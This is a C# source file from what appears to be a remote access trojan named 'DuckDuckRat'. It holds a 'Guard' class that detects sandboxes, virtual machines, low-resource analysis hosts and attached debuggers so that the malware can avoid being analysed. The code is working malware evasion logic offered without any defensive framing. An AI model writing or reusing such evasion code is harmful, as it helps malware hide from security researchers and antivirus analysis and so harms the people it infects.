using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;

namespace DuckDuckRat
{
    public static class Guard
    {
        public static bool CheckEnvironment()
        {
            if (IsSandbox()) return true;
            if (IsVM()) return true;
            if (IsLowResource()) return true;
            if (IsDebuggerPresent()) return true;
            return false;
        }

        private static bool IsSandbox()
        {
            try
            {
                string user = Environment.UserName.ToLower();
                string[] sandboxUsers = { "sandbox", "virus", "malware", "test", "user", "vmware", "vbox", "wdagutilityaccount" };
                if (sandboxUsers.Any(u => user.Contains(u))) return true;

                string comp = Environment.MachineName.ToLower();
                if (comp.Contains("sandbox") || comp.Contains("vm")) return true;

                // Check for common sandbox files
                if (File.Exists(@"C:\windows\System32\Drivers\Vmmouse.sys")) return true;
                if (File.Exists(@"C:\windows\System32\Drivers\Vboxguest.sys")) return true;
            }
            catch { }
            return false;
        }

        private static bool IsVM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"].ToString().ToLower();
                            string model = item["Model"].ToString().ToLower();
                            if (manufacturer.Contains("microsoft") && model.Contains("virtual")) return true;
                            if (manufacturer.Contains("vmware") || model.Contains("vmware")) return true;
                            if (manufacturer.Contains("innotek") || model.Contains("virtualbox")) return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool IsLowResource()
        {
            try
            {
                // Check CPU Cores
                if (Environment.ProcessorCount < 2) return true;

                // Check RAM (using Management to get total physical memory)
                long ramBytes = 0;
                using (var searcher = new ManagementObjectSearcher("Select TotalPhysicalMemory from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        ramBytes = Convert.ToInt64(item["TotalPhysicalMemory"]);
                        break;
                    }
                }
                if (ramBytes > 0 && ramBytes < 3L * 1024 * 1024 * 1024) return true; // < 3GB

                // Check Disk Size (System Drive)
                string sysDrive = Path.GetPathRoot(Environment.SystemDirectory);
                DriveInfo drive = new DriveInfo(sysDrive);
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return true; // < 60GB
            }
            catch { }
            return false;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();
    }
}


